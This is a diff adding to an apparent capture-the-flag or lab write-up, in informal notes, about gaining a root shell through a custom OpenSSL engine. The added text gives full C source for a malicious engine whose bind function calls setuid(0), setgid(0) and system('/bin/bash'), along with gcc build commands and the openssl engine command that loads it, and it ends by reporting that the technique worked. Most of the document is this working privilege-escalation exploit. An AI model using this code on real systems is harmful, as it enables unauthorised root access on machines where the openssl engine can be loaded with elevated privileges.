@@ -135,3 +135,43 @@ Turns out this doesn't work ...
 Now we have to create a ssl engine.
 https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/
 Looks pretty easy though
+
+This is the most basic openssl engine that compiles:
+
+#include <openssl/engine.h>
+
+static int bind(ENGINE *e, const char *id)
+{
+  return 1;
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+
+Now we can add our rootshell ecommand
+
+#include <openssl/engine.h>
+#include <unistd.h>
+
+static int bind(ENGINE *e, const char *id)
+{
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
+}
+
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+
+
+gcc -fPIC -o silly-engine.o -c silly-engine.c
+gcc -shared -o silly-engine.so -lcrypto silly-engine.o
+
+openssl engine -t `pwd`/ssl-foo.so
+
+
+
+after some struggling it finnaly worked !
+
+[![https://imgur.com/VUrF7t0.png](https://imgur.com/VUrF7t0.png)](https://imgur.com/VUrF7t0.png)
